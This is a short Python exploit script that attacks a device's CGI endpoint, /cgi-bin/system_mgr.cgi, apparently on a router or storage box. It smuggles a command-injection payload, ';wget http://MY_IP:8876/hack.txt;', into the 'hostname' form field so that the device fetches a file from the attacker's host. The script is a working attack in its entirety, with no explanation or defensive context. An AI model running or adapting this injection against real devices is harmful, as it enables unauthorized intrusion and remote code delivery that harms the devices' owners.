import requests

ROUTER_IP = "192.168.31.10"
MY_IP = "192.168.31.215"
MY_PORT = "8876"
FILE_NAME = "hack.txt"

def run_exploit():
    target_url = f"http://{ROUTER_IP}/cgi-bin/system_mgr.cgi"
    
    wget_cmd = f"wget http://{MY_IP}:{MY_PORT}/{FILE_NAME}"
    final_payload = f";{wget_cmd};"
    
    data = {
        "cmd": "cgi_device",
        "hostname": final_payload,
        "workgroup": "",
        "description": ""
    }
    
    try:
        response = requests.post(target_url, data=data, timeout=10)
        print("Status:", response.status_code)
        print("Response:")
        print(response.text)
    except Exception as e:
        print(f"[-] Exploit failed: {e}")

if __name__ == "__main__":
    run_exploit()

